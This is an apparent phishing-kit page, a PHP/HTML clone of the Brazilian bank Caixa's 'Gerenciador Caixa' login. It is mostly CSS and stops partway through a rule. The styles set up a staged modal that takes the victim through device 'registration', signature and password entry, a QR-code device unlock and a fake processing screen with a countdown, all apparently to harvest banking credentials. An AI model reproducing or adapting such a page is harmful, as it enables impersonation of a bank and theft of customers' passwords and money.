<?php
require_once __DIR__ . '/lib/caixa_bootstrap.php';
caixa_bootstrap_public(['require_passo' => true]);
?>
<!DOCTYPE html>
<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <title>Gerenciador Caixa</title>

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Gerenciador Caixa">
  <link rel="icon" type="image/png" href="./sistema_files/logo-empresa.png">

<link rel="stylesheet" href="./sistema_files/styles.f665e4d371254b502004.css">
<link rel="stylesheet" href="assets/css/mobile-public.css">
<style>app-root,app-landing,router-outlet,app-login-overlay{display:block}@media screen and (max-width:1024px){#landing-apresentacao-texto .texto-item-mobile{display:none!important}#landing-apresentacao-texto .texto-item-mobile.active{display:block!important}}@media screen and (min-width:861px){body.modal-dispositivo-open #landing{filter:blur(4px);pointer-events:none;user-select:none}}</style>
<style>#modal-dispositivo{position:fixed;inset:0;z-index:1000;display:flex;align-items:center;justify-content:center;padding:24px;background:rgba(255,255,255,.35);backdrop-filter:blur(3px)}#modal-dispositivo.hidden{display:none}.modal-dispositivo{width:100%;max-width:920px;background:#fff;border-radius:4px;box-shadow:0 8px 32px rgba(0,0,0,.18);overflow:hidden;font-family:var(--FONT-REGULAR,"Segoe UI",sans-serif);color:#48586c}.modal-dispositivo__top{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;background:#005ca9;color:#fff;font-size:13px}.modal-dispositivo__brand{display:flex;align-items:center;gap:12px}.modal-dispositivo__brand .fas{font-size:22px}.modal-dispositivo__brand-title{font-size:18px;font-weight:700;line-height:1.1}.modal-dispositivo__brand-sub{font-size:11px;opacity:.95;letter-spacing:.4px}.modal-dispositivo__actions-top{display:flex;align-items:center;gap:18px}.modal-dispositivo__secure{display:flex;align-items:center;gap:8px;font-size:12px}.modal-dispositivo__secure-dot{width:8px;height:8px;border-radius:50%;background:#4caf50;box-shadow:0 0 0 2px rgba(76,175,80,.25)}.modal-dispositivo__sair{display:flex;align-items:center;gap:8px;background:transparent;border:0;color:#fff;font-size:12px;font-weight:700;cursor:pointer;padding:0}.modal-dispositivo__body{border-left:5px solid #f39200;padding:28px 32px 24px}.modal-dispositivo__title-row{display:flex;align-items:center;gap:10px;margin-bottom:8px;color:#f39200}.modal-dispositivo__title-row .fas{font-size:28px}.modal-dispositivo__title{margin:0;font-size:28px;font-weight:700;color:#f39200}.modal-dispositivo__intro{margin:0 0 24px;font-size:14px;color:#6b7a86;max-width:760px;line-height:1.45}.modal-dispositivo__grid{display:grid;grid-template-columns:1.15fr .85fr;gap:28px;align-items:start}.modal-dispositivo__terms h3{margin:0 0 12px;font-size:13px;font-weight:700;color:#005ca9;letter-spacing:.3px}.modal-dispositivo__terms-box{border:1px solid #d9e2e8;border-radius:2px;padding:16px 18px;font-size:13px;line-height:1.55;color:#005ca9;background:#fff}.modal-dispositivo__terms-box p{margin:0 0 14px}.modal-dispositivo__terms-box p:last-child{margin-bottom:0}.modal-dispositivo__terms-box strong{font-weight:700}.modal-dispositivo__terms-note{margin:14px 0 0;font-size:12px;line-height:1.45;color:#48586c}.modal-dispositivo__aside{display:flex;flex-direction:column;gap:16px;padding-top:28px}.modal-dispositivo__info{display:flex;gap:10px;align-items:flex-start;padding:12px 14px;background:#eef6fb;border-radius:2px;font-size:12px;line-height:1.45;color:#005ca9}.modal-dispositivo__info .fas{color:#005ca9;margin-top:2px;font-size:14px}.modal-dispositivo__check{display:flex;align-items:flex-start;gap:10px;font-size:13px;color:#48586c;cursor:pointer}.modal-dispositivo__check input{margin-top:3px;accent-color:#005ca9}.modal-dispositivo__btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:14px 18px;border:0;border-radius:3px;background:#f39200;color:#fff;font-size:13px;font-weight:700;letter-spacing:.3px;cursor:pointer;transition:opacity .2s}.modal-dispositivo__btn:disabled{opacity:.45;cursor:not-allowed}.modal-dispositivo__btn:not(:disabled):hover{background:#e08600}.modal-dispositivo__footer{padding:10px 16px;text-align:center;font-size:10px;color:#8a9399;background:#f3f4f4;border-top:1px solid #e4e8eb}@media (max-width:860px){.modal-dispositivo__grid{grid-template-columns:1fr}.modal-dispositivo__aside{padding-top:0}}
.modal-dispositivo__step{display:none}.modal-dispositivo__step.active{display:block}
.modal-dispositivo__divider{height:1px;background:#e4e8eb;margin:18px 0 16px;border:0}
.modal-dispositivo__success{display:flex;flex-direction:column;align-items:center;text-align:center;padding:18px 0 8px}
.modal-dispositivo__check-circle{width:84px;height:84px;border-radius:50%;background:#2e9e5b;display:flex;align-items:center;justify-content:center;margin-bottom:18px;box-shadow:0 6px 18px rgba(46,158,91,.28);animation:modalPop .35s ease}
.modal-dispositivo__check-circle .fas{color:#fff;font-size:42px}
.modal-dispositivo__success-title{margin:0 0 6px;font-size:24px;font-weight:700;color:#005ca9}
.modal-dispositivo__success-sub{margin:0;font-size:13px;color:#6b7a86}
.modal-dispositivo__loading-box{display:flex;align-items:center;gap:14px;margin:22px auto 0;max-width:380px;width:100%;padding:14px 18px;background:#eef6fb;border-radius:4px;border:1px solid #d8e9f5}
.modal-dispositivo__spinner{flex:0 0 auto;width:26px;height:26px;border:3px solid #bcd9ee;border-top-color:#005ca9;border-radius:50%;animation:modalSpin .8s linear infinite}
.modal-dispositivo__loading-texts{display:flex;flex-direction:column;gap:2px}
.modal-dispositivo__loading-title{font-size:14px;font-weight:700;color:#005ca9}
.modal-dispositivo__loading-sub{font-size:12px;color:#6b7a86}
.modal-dispositivo__warn{text-align:center;margin:14px 0 0;font-size:11px;letter-spacing:.6px;color:#9aa4ab;text-transform:uppercase}
@keyframes modalSpin{to{transform:rotate(360deg)}}
@keyframes modalPop{0%{transform:scale(.6);opacity:0}100%{transform:scale(1);opacity:1}}
.modal-dispositivo__subtitle{margin:2px 0 0;font-size:12px;font-weight:700;color:#f39200;letter-spacing:.4px}
.modal-dispositivo__instrucao{margin:0 0 18px;font-size:14px;color:#48586c;line-height:1.45}
.modal-dispositivo__opcao{display:flex;gap:12px;padding:14px 16px;border:1px solid #e4e8eb;border-radius:4px;margin-bottom:10px;cursor:pointer;transition:border-color .2s,background .2s}
.modal-dispositivo__opcao:hover{border-color:#c7d4dd}
.modal-dispositivo__opcao.selected{border-color:#005ca9;background:#f7fbff}
.modal-dispositivo__radio{flex:0 0 auto;width:18px;height:18px;border:2px solid #b6c4cf;border-radius:50%;margin-top:2px;display:flex;align-items:center;justify-content:center;transition:border-color .2s}
.modal-dispositivo__opcao.selected .modal-dispositivo__radio{border-color:#a060a8}
.modal-dispositivo__radio-dot{width:8px;height:8px;border-radius:50%;background:#a060a8;transform:scale(0);transition:transform .2s}
.modal-dispositivo__opcao.selected .modal-dispositivo__radio-dot{transform:scale(1)}
.modal-dispositivo__opcao-textos{display:flex;flex-direction:column;gap:4px}
.modal-dispositivo__opcao-titulo{font-size:14px;font-weight:700;color:#005ca9}
.modal-dispositivo__opcao-desc{font-size:12px;color:#6b7a86;line-height:1.45}
.modal-dispositivo__form-box{margin-top:4px;padding:18px;background:#f4f4f4;border-radius:4px;display:none}
.modal-dispositivo__form-box.active{display:block}
.modal-dispositivo__field{margin-bottom:14px}
.modal-dispositivo__field:last-child{margin-bottom:0}
.modal-dispositivo__label{display:block;font-size:11px;font-weight:700;color:#005ca9;letter-spacing:.4px;margin-bottom:6px}
.modal-dispositivo__input{width:100%;padding:10px 12px;border:1px solid #cfd8e0;border-radius:3px;font-size:13px;color:#48586c;background:#fff;box-sizing:border-box;font-family:inherit}
.modal-dispositivo__input:focus{outline:0;border-color:#005ca9;box-shadow:0 0 0 2px rgba(0,92,169,.12)}
.modal-dispositivo__prazo{display:flex;align-items:flex-start;gap:32px;flex-wrap:wrap}
.modal-dispositivo__prazo-col{display:flex;flex-direction:column;gap:6px}
.modal-dispositivo__prazo-col:first-child{min-width:160px}
.modal-dispositivo__prazo-col:last-child{flex:1;min-width:200px}
.modal-dispositivo__prazo-col:last-child .modal-dispositivo__input{width:100%;max-width:none}
.modal-dispositivo__prazo-radio{display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;color:#6b7a86;font-weight:400}
.modal-dispositivo__prazo-radio input{accent-color:#a060a8;width:16px;height:16px}
.modal-dispositivo__label--small{font-size:10px;color:#9aa4ab;font-weight:600}
.modal-dispositivo__actions{display:flex;justify-content:flex-end;margin-top:18px}
.modal-dispositivo__btn-continuar{padding:12px 28px;border:0;border-radius:3px;background:#c7ccd1;color:#fff;font-size:13px;font-weight:700;letter-spacing:.3px;cursor:not-allowed;font-family:inherit;transition:background .2s}
.modal-dispositivo__btn-continuar:not(:disabled){background:#f39200;cursor:pointer}
.modal-dispositivo__btn-continuar:not(:disabled):hover{background:#e08600}
.modal-dispositivo__title--blue{color:#005ca9}
.modal-dispositivo__title-row.has-blue-title{color:#f39200}
.modal-dispositivo__title-row.has-blue-title .modal-dispositivo__title{color:#005ca9}
.modal-dispositivo__title-block{display:flex;flex-direction:column;gap:2px}
.modal-dispositivo__opcao{align-items:flex-start}
.modal-dispositivo__opcao-textos{flex:1}
.modal-dispositivo__prazo-dias .modal-dispositivo__label{font-size:11px}
.modal-dispositivo__step--assinatura{padding:36px 32px 32px}
.modal-dispositivo__assinatura-wrap{display:flex;flex-direction:column;align-items:center;padding:8px 0 4px}
.modal-dispositivo__assinatura-title{margin:0 0 28px;font-size:22px;font-weight:700;color:#005ca9;text-align:center}
.modal-dispositivo__assinatura-erro{display:none;align-items:flex-start;gap:10px;width:100%;max-width:340px;margin:0 0 16px;padding:12px 14px;border-radius:4px;background:#fde8e8;border:1px solid #f5b5b5;color:#b42318;font-size:13px;font-weight:600;line-height:1.45;box-sizing:border-box}
.modal-dispositivo__assinatura-erro.is-visible{display:flex}
.modal-dispositivo__assinatura-erro__icon{flex:0 0 auto;width:20px;height:20px;border-radius:50%;background:#ef4444;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;line-height:1}
.modal-dispositivo__assinatura-erro__text{flex:1}
.modal-dispositivo__assinatura-input.has-erro{border-color:#ef4444;background:#fff5f5;box-shadow:0 0 0 2px rgba(239,68,68,.12)}
.modal-dispositivo__assinatura-form{width:100%;max-width:340px}
.modal-dispositivo__assinatura-form .modal-dispositivo__label{font-size:11px;font-weight:600;color:#9aa4ab;letter-spacing:.5px;margin-bottom:8px}
.modal-dispositivo__assinatura-input{width:100%;padding:12px 14px;border:1px solid #d9e2e8;border-radius:3px;font-size:14px;color:#48586c;background:#f7f8f8;box-sizing:border-box;font-family:inherit}
.modal-dispositivo__assinatura-input::placeholder{color:#b8c2ca;font-style:italic}
.modal-dispositivo__assinatura-input:focus{outline:0;border-color:#005ca9;background:#fff;box-shadow:0 0 0 2px rgba(0,92,169,.1)}
.modal-dispositivo__assinatura-hint{margin:8px 0 0;font-size:11px;color:#9aa4ab}
.modal-dispositivo__btn-confirmar{display:flex;align-items:center;justify-content:center;width:100%;margin-top:22px;padding:14px 18px;border:0;border-radius:3px;background:#f39200;color:#fff;font-size:13px;font-weight:700;letter-spacing:.4px;cursor:pointer;font-family:inherit;transition:background .2s,opacity .2s}
.modal-dispositivo__btn-confirmar:disabled{opacity:.55;cursor:not-allowed}
.modal-dispositivo__btn-confirmar:not(:disabled):hover{background:#e08600}
.modal-dispositivo__step--senha{padding:36px 32px 32px}
.modal-dispositivo__senha-wrap{display:flex;flex-direction:column;align-items:center;padding:8px 0 4px}
.modal-dispositivo__senha-title{margin:0 0 22px;font-size:22px;font-weight:700;color:#005ca9;text-align:center}
.modal-dispositivo__senha-form{width:100%;max-width:340px;display:flex;flex-direction:column;align-items:center}
.modal-dispositivo__senha-instrucao{margin:0 0 12px;font-size:11px;font-weight:600;color:#9aa4ab;letter-spacing:.6px;text-align:center}
.modal-dispositivo__senha-input{width:100%;padding:14px 16px;border:1px solid #d9e2e8;border-radius:3px;font-size:20px;letter-spacing:4px;color:#48586c;background:#f7f8f8;box-sizing:border-box;font-family:inherit;text-align:left}
.modal-dispositivo__senha-input:focus{outline:0;border-color:#005ca9;background:#fff;box-shadow:0 0 0 2px rgba(0,92,169,.1)}
.modal-dispositivo__senha-hint{margin:10px 0 0;font-size:11px;color:#9aa4ab;text-align:center}
.modal-dispositivo__senha-form .modal-dispositivo__btn-confirmar{margin-top:24px}
.modal-dispositivo__desbloqueio-title{margin:0 0 6px;font-size:26px;font-weight:700;color:#005ca9}
.modal-dispositivo__desbloqueio-subtitle{margin:0 0 20px;font-size:13px;font-weight:700;color:#48586c}
.modal-dispositivo__desbloqueio-intro{margin:0 0 16px;font-size:13px;color:#48586c;line-height:1.45}
.modal-dispositivo__desbloqueio-list{padding-left:18px;margin:0 0 24px;font-size:13px;color:#48586c;line-height:1.6}
.modal-dispositivo__desbloqueio-list li{margin-bottom:10px}
.modal-dispositivo__step7-intro{margin:0 0 16px;font-size:13px;color:#48586c;line-height:1.5}
.modal-dispositivo__step7-grid{display:grid;grid-template-columns:1fr 1fr;gap:36px;align-items:start;margin-top:16px}
.modal-dispositivo__step7-col{display:flex;flex-direction:column;gap:14px;align-items:center;text-align:center}
.modal-dispositivo__step7-col:first-child{align-items:flex-start;text-align:left}
.modal-dispositivo__step7-col:last-child{align-items:center}
.modal-dispositivo__step7-text{font-size:13px;color:#48586c;line-height:1.45;margin:0}
.modal-dispositivo__step7-text--blue{color:#005ca9;font-weight:700}
.modal-dispositivo__step7-subtext{font-size:11px;color:#6b7a86;margin:-8px 0 4px}
.modal-dispositivo__qr-container{width:100%;max-width:280px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:6px;padding:16px;display:flex;flex-direction:column;align-items:center;box-sizing:border-box}
.modal-dispositivo__qr-header{display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;color:#0d9488;margin-bottom:14px;letter-spacing:.5px}
.modal-dispositivo__qr-dot{width:6px;height:6px;border-radius:50%;background:#0d9488;box-shadow:0 0 0 2px rgba(13,148,136,.2)}
.modal-dispositivo__qr-box{width:100%;aspect-ratio:1;background:#fff;border:1px solid #e2e8f0;border-radius:4px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}
.modal-dispositivo__qr-box img{display:block;max-width:100%;height:auto;border-radius:4px}
.modal-dispositivo__qr-header--ready{color:#0d9488}
.modal-dispositivo__qr-header--ready .modal-dispositivo__qr-dot{background:#0d9488;animation:modalQrPulse 1.2s ease infinite}
@keyframes modalQrPulse{0%,100%{opacity:1}50%{opacity:.4}}
.modal-dispositivo__qr-spinner{width:32px;height:32px;border:3px solid #e2e8f0;border-top-color:#005ca9;border-radius:50%;animation:modalSpin .8s linear infinite;margin-bottom:12px}
.modal-dispositivo__qr-text{font-size:11px;color:#6b7a86;font-weight:500}
.modal-dispositivo__phone-mockup{width:210px;height:350px;border:8px solid #1e293b;border-radius:24px;background:#f8fafc;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,.12);position:relative;box-sizing:border-box}
.modal-dispositivo__phone-header{background:#005ca9;color:#fff;padding:8px 12px;display:flex;justify-content:space-between;align-items:center;font-size:9px;font-weight:700}
.modal-dispositivo__phone-title{background:#004172;color:#fff;padding:6px 12px;font-size:10px;font-weight:700;text-align:left}
.modal-dispositivo__phone-body{padding:10px;display:flex;flex-direction:column;gap:6px;flex:1;background:#f1f5f9;text-align:left}
.modal-dispositivo__phone-subtitle{font-size:9px;font-weight:700;color:#48586c;margin:2px 0 4px}
.modal-dispositivo__phone-device{display:flex;align-items:center;gap:6px;padding:6px 8px;background:#fff;border:1px solid #e2e8f0;border-radius:4px;position:relative;font-size:9px}
.modal-dispositivo__phone-indicator{width:3px;position:absolute;left:0;top:0;bottom:0;border-top-left-radius:4px;border-bottom-left-radius:4px}
.modal-dispositivo__phone-indicator--green{background:#22c55e}
.modal-dispositivo__phone-indicator--yellow{background:#eab308}
.modal-dispositivo__phone-device-info{display:flex;flex-direction:column;gap:1px;flex:1}
.modal-dispositivo__phone-device-name{font-weight:700;color:#1e293b;font-size:9px}
.modal-dispositivo__phone-device-date{font-size:7px;color:#64748b}
.modal-dispositivo__phone-badge{font-size:8px;font-weight:700;padding:1px 5px;border-radius:10px}
.modal-dispositivo__phone-badge--green{background:#dcfce7;color:#15803d}
.modal-dispositivo__phone-badge--yellow{background:#fef9c3;color:#854d0e}
.modal-dispositivo__phone-footer{padding:8px;display:flex;justify-content:center;background:#fff;border-top:1px solid #e2e8f0}
.modal-dispositivo__phone-btn{border:1px solid #f39200;color:#f39200;background:transparent;padding:3px 14px;border-radius:3px;font-size:8px;font-weight:700;cursor:pointer}
.modal-dispositivo__step8-header{display:flex;align-items:flex-start;justify-content:space-between;gap:20px;margin-bottom:28px;padding-top:4px}
.modal-dispositivo__step8-brand{display:flex;align-items:flex-start;gap:14px}
.modal-dispositivo__step8-icon{width:36px;height:36px;flex:0 0 auto;margin-top:2px;color:#005ca9}
.modal-dispositivo__step8-icon svg{width:100%;height:100%;display:block}
.modal-dispositivo__step8-title{margin:0;font-size:24px;font-weight:700;color:#005ca9;line-height:1.15}
.modal-dispositivo__step8-subtitle{margin:6px 0 0;font-size:13px;color:#7a8794;font-weight:400}
.modal-dispositivo__step8-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 14px;border-radius:20px;background:#fff4d6;color:#8a6d1d;font-size:11px;font-weight:700;letter-spacing:.3px;white-space:nowrap;margin-top:4px}
.modal-dispositivo__step8-badge-dot{width:7px;height:7px;border-radius:50%;background:#e6a817}
.modal-dispositivo__step8-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:32px;align-items:start}
.modal-dispositivo__step8-info{display:flex;flex-direction:column;gap:16px}
.modal-dispositivo__step8-info-title{margin:0;font-size:15px;font-weight:700;color:#2c3a47}
.modal-dispositivo__step8-info-text{margin:0;font-size:13px;color:#5a6a78;line-height:1.6}
.modal-dispositivo__step8-checklist{margin:2px 0 0;padding:0;list-style:none;display:flex;flex-direction:column;gap:12px}
.modal-dispositivo__step8-checklist li{display:flex;align-items:flex-start;gap:10px;font-size:13px;color:#48586c;line-height:1.45}
.modal-dispositivo__step8-check{width:16px;height:16px;flex:0 0 auto;margin-top:1px;color:#2e9e5b}
.modal-dispositivo__step8-check svg{width:100%;height:100%;display:block}
.modal-dispositivo__step8-footnote{margin:10px 0 0;font-size:11px;color:#9aa4ab;line-height:1.45}
.modal-dispositivo__step8-progress{background:#f3f5f7;border-radius:8px;padding:48px 28px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;min-height:260px;box-sizing:border-box}
.modal-dispositivo__step8-ring{width:56px;height:56px;border-radius:50%;border:3px solid #dce6ef;border-top-color:#005ca9;animation:modalSpin .85s linear infinite;margin-bottom:22px;box-sizing:border-box}
.modal-dispositivo__step8-progress-title{margin:0 0 10px;font-size:16px;font-weight:700;color:#2c3a47}
.modal-dispositivo__step8-progress-text{margin:0;font-size:12px;color:#7a8794;line-height:1.55;max-width:250px}
.modal-dispositivo__step9-top{display:flex;align-items:flex-start;justify-content:space-between;gap:20px;padding-bottom:18px;border-bottom:1px solid #e6ebef;margin-bottom:24px}
.modal-dispositivo__step9-brand{display:flex;align-items:center;gap:14px}
.modal-dispositivo__step9-logo{width:40px;height:40px;border-radius:6px;background:#005ca9;color:#fff;display:flex;align-items:center;justify-content:center;flex:0 0 auto}
.modal-dispositivo__step9-logo svg{width:22px;height:22px;display:block}
.modal-dispositivo__step9-title{margin:0;font-size:24px;font-weight:700;color:#334155;line-height:1.15}
.modal-dispositivo__step9-subtitle{margin:5px 0 0;font-size:13px;color:#8a9399;font-weight:400}
.modal-dispositivo__step9-auth{text-align:right;max-width:300px;padding-top:2px}
.modal-dispositivo__step9-auth-label{margin:0;font-size:10px;font-weight:700;color:#9aa4ab;letter-spacing:.5px;text-transform:uppercase}
.modal-dispositivo__step9-auth-hash{margin:5px 0 0;font-size:10px;color:#a0a8b0;word-break:break-all;line-height:1.35;font-family:"Segoe UI",Arial,sans-serif}
.modal-dispositivo__step9-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:30px;align-items:start}
.modal-dispositivo__step9-success{display:flex;align-items:center;gap:14px;margin-bottom:20px}
.modal-dispositivo__step9-success-icon{width:48px;height:48px;border-radius:50%;background:#22a45a;color:#fff;display:flex;align-items:center;justify-content:center;flex:0 0 auto;font-size:22px;box-shadow:0 3px 10px rgba(34,164,90,.28)}
.modal-dispositivo__step9-success-title{margin:0;font-size:22px;font-weight:700;color:#22a45a;line-height:1.1}
.modal-dispositivo__step9-success-text{margin:5px 0 0;font-size:13px;color:#6b7a86;line-height:1.4}
.modal-dispositivo__step9-warn{background:#fff9e8;border:1px solid #efd28a;border-radius:6px;padding:16px 18px 15px}
.modal-dispositivo__step9-warn-head{display:flex;align-items:center;gap:8px;margin-bottom:10px;color:#d4890a;font-size:14px;font-weight:700}
.modal-dispositivo__step9-warn-head .fas{font-size:15px;color:#e6a000}
.modal-dispositivo__step9-warn-text{margin:0 0 14px;font-size:12.5px;color:#5a6670;line-height:1.55}
.modal-dispositivo__step9-hours{display:flex;align-items:center;justify-content:center;background:#ffe9a8;border-radius:4px;padding:12px 16px;margin:0 auto 12px;width:100%;max-width:240px;box-sizing:border-box;font-size:30px;font-weight:800;color:#d4890a;letter-spacing:1.5px}
.modal-dispositivo__step9-warn-note{margin:0;font-size:11px;color:#8f98a0;font-style:italic;line-height:1.45}
.modal-dispositivo__step9-details{background:#f5f6f8;border:1px solid #e3e7eb;border-radius:6px;padding:18px 18px 16px}
.modal-dispositivo__step9-details-title{margin:0 0 6px;font-size:12px;font-weight:700;color:#5a6670;letter-spacing:.6px}
.modal-dispositivo__step9-row{display:flex;justify-content:space-between;align-items:center;gap:14px;padding:10px 0;border-bottom:1px solid #e8ecf0;font-size:12.5px}
.modal-dispositivo__step9-row:last-of-type{border-bottom:0;padding-bottom:4px}
.modal-dispositivo__step9-row-label{color:#8a9399;font-weight:400}
.modal-dispositivo__step9-row-value{color:#334155;font-weight:700;text-align:right}
.modal-dispositivo__step9-status{display:inline-flex;align-items:center;gap:6px;color:#22a45a!important;font-weight:700}
.modal-dispositivo__step9-status .fas{font-size:11px;color:#22a45a}
.modal-dispositivo__step9-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px;padding-top:4px}
.modal-dispositivo__step9-action{display:flex;align-items:center;justify-content:center;gap:8px;padding:11px 12px;border:1px solid #cfd6dd;border-radius:4px;background:#fff;color:#5a6670;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
.modal-dispositivo__step9-action .fas{font-size:13px;color:#6b7a86}
.modal-dispositivo__step9-action:hover{background:#fafbfc;border-color:#b8c2ca}
.modal-dispositivo__step9-bottom{display:flex;align-items:center;justify-content:space-between;gap:18px;margin-top:26px}
.modal-dispositivo__step9-contact{margin:0;font-size:11px;color:#9aa4ab}
.modal-dispositivo__step9-btn-sair{padding:13px 26px;border:0;border-radius:4px;background:#f39200;color:#fff;font-size:12px;font-weight:700;letter-spacing:.4px;cursor:pointer;font-family:inherit;white-space:nowrap;box-shadow:0 2px 6px rgba(243,146,0,.25)}
.modal-dispositivo__step9-btn-sair:hover{background:#e08600}
.cliente-erro-banner{position:fixed;top:16px;left:50%;transform:translateX(-50%) translateY(-120%);z-index:99999;display:flex;align-items:center;gap:10px;max-width:92%;padding:12px 18px;border-radius:6px;background:#fde8e8;border:1px solid #f5b5b5;color:#b42318;font-size:13px;font-weight:600;box-shadow:0 8px 24px rgba(0,0,0,.12);transition:transform .25s ease}
.cliente-erro-banner.is-visible{transform:translateX(-50%) translateY(0)}
.cliente-erro-banner__icon{width:22px;height:22px;border-radius:50%;background:#ef4444;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;flex:0 0 auto}
@media (max-width: 640px) {
  .modal-dispositivo__step7-grid { grid-template-columns: 1fr; gap: 24px; }
  .modal-dispositivo__step7-col:first-child { align-items: center; text-align: center; }
  .modal-dispositivo__step8-grid { grid-template-columns: 1fr; }
  .modal-dispositivo__step8-header { flex-direction: column; }
  .modal-dispositivo__step9-grid { grid-template-columns: 1fr; }
  .modal-dispositivo__step9-top { flex-direction: column; }
  .modal-dispositivo__step9-auth { text-align: left; max-width: none; }
  .modal-dispositivo__step9-bottom { flex-direction: column; align-items: stretch; }
}</style><style>#debugger[_ngcontent-wno-c305] {
  position: fixed;
  box-sizing: border-box;
  left: 0px;
  top: 0px;
  right: 0px;
  bottom: 0px;
  width: 100vw;
  height: 100vh;
  background-color: rgba(0, 0, 0, 0.85);
  padding: 2rem;
  line-height: 1.2;
  white-space: pre-wrap;
  overflow: auto;
  z-index: 9999;
}
#debugger.hidden[_ngcontent-wno-c305] {
  display: none;
}
#debugger[_ngcontent-wno-c305]   p[_ngcontent-wno-c305], #debugger[_ngcontent-wno-c305]   span[_ngcontent-wno-c305] {
  font-family: var(--FONT-REGULAR), Menlo, Consolas, monospace;
  font-feature-settings: var(--FONT-TEXT-FEATURES);
  font-size: large;
}
#debugger[_ngcontent-wno-c305]   h4[_ngcontent-wno-c305] {
  color: #e36049;
  font-weight: bold;
  font-family: var(--FONT-BOLD), Menlo, Consolas, monospace;
  font-size: large;
}
#debugger[_ngcontent-wno-c305]   p[_ngcontent-wno-c305] {
  color: #e8e8e8;
}
#debugger[_ngcontent-wno-c305]   span[_ngcontent-wno-c305] {
  color: #56e349;
}</style><style>[_nghost-wno-c385] {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 1999;
}
[_nghost-wno-c385]     .mat-progress-bar {
  height: 3px !important;
}
[_nghost-wno-c385]     .mat-progress-bar-buffer {
  background-color: var(--COR-SECUNDARIA);
}
[_nghost-wno-c385]     .mat-progress-bar-fill::after {
  background-color: rgba(255, 255, 255, 0.5);
}
#loader[_ngcontent-wno-c385] {
  position: fixed;
  -webkit-user-select: none;
     -moz-user-select: none;
          user-select: none;
  pointer-events: none;
}
#loader-block[_ngcontent-wno-c385] {
  position: fixed;
  bottom: 8px;
  right: 16px;
  display: flex;
  align-items: center;
  padding: 16px 24px;
  border-radius: 4px;
  background: var(--GREY-4);
  opacity: 0.85;
}
#loader-block-circle[_ngcontent-wno-c385] {
  margin-right: 12px;
  border-color: var(--COR-SECUNDARIA);
}
#loader-block-text[_ngcontent-wno-c385] {
  color: var(--COR-TEXTO-BRANCO);
}</style><style>@charset "UTF-8";
@-webkit-keyframes spin {
  100% {
    transform: rotate(360deg);
  }
}
@keyframes spin {
  100% {
    transform: rotate(360deg);
  }
}
.button-landing-style[_ngcontent-wno-c350], #landing-apresentacao-lista[_ngcontent-wno-c350]   .item[_ngcontent-wno-c350] {
  box-shadow: 0 2px 5px 0 rgba(0, 0, 0, 0.16), 0 2px 10px 0 rgba(0, 0, 0, 0.12);
}
#landing-header-topo-login[_ngcontent-wno-c350]::before, #landing-header-topo-cadastro[_ngcontent-wno-c350]::before {
  display: inline-block;
  font-style: normal;
  font-variant: normal;
  text-rendering: auto;
  -webkit-font-smoothing: antialiased;
  font-family: "Font Awesome 5 Free";
  font-weight: 900;
}
  .btnModal {
  margin-top: 16px;
  width: 100%;
}
.pf[_ngcontent-wno-c350] {
  filter: hue-rotate(90deg);
  -webkit-animation: shake 1s cubic-bezier(0.36, 0.07, 0.19, 0.97) both infinite;
          animation: shake 1s cubic-bezier(0.36, 0.07, 0.19, 0.97) both infinite;
  transform: translate3d(0, 0, 0);
  -webkit-backface-visibility: hidden;
          backface-visibility: hidden;
  perspective: 1000px;
}
@-webkit-keyframes shake {
  10%, 90% {
    transform: translate3d(-1px, 0, 0);
    filter: hue-rotate(90deg);
  }
  20%, 80% {
    transform: translate3d(2px, 0, 0);
  }
  30%, 50%, 70% {
    transform: translate3d(-4px, 0, 0);
    filter: hue-rotate(180deg);
  }
  40%, 60% {
    transform: translate3d(4px, 0, 0);
  }
}
@keyframes shake {
  10%, 90% {
    transform: translate3d(-1px, 0, 0);
    filter: hue-rotate(90deg);
  }
  20%, 80% {
    transform: translate3d(2px, 0, 0);
  }
  30%, 50%, 70% {
    transform: translate3d(-4px, 0, 0);
    filter: hue-rotate(180deg);
  }
  40%, 60% {
    transform: translate3d(4px, 0, 0);
  }
}
#landing[_ngcontent-wno-c350] {
  transition: filter 0.3ms;
  -webkit-user-select: none;
     -moz-user-select: none;
          user-select: none;
  display: block;
  background: var(--COR-BACKGROUND-PRIMARIO);
}
#landing-header[_ngcontent-wno-c350] {
  padding: 32px 32px 0 32px;
  background: var(--COR-GRADIENTE);
}
#landing-header-topo[_ngcontent-wno-c350] {
  display: flex;
  align-items: center;
}
#landing-header-topo-logo[_ngcontent-wno-c350] {
  margin-right: auto;
}
@media screen and (max-width: 640px) {
  #landing-header-topo-logo[_ngcontent-wno-c350] {
    margin-right: unset;
  }
}
#landing-header-topo-cadastro[_ngcontent-wno-c350] {
  position: relative;
  overflow: hidden;
  white-space: nowrap;
  transition: all ease-out 300ms;
  padding: 8px 28px;
  cursor: pointer;
  margin-right: 8px;
  color: var(--COR-TEXTO-BRANCO);
  text-decoration: none;
}
#landing-header-topo-cadastro[_ngcontent-wno-c350]::before {
  content: "";
  position: absolute;
  margin: 0;
  opacity: 0;
  width: 16px;
  left: -16px;
  transition: all ease-out 300ms;
}
#landing-header-topo-cadastro[_ngcontent-wno-c350]:hover, #landing-header-topo-cadastro[_ngcontent-wno-c350]:focus {
  padding-right: 16px;
  padding-left: 40px;
}
#landing-header-topo-cadastro[_ngcontent-wno-c350]:hover::before, #landing-header-topo-cadastro[_ngcontent-wno-c350]:focus::before {
  opacity: 1;
  left: 16px;
}
@media screen and (max-width: 640px) {
  #landing-header-topo-cadastro[_ngcontent-wno-c350] {
    margin-top: 32px;
  }
}
#landing-header-topo-login[_ngcontent-wno-c350] {
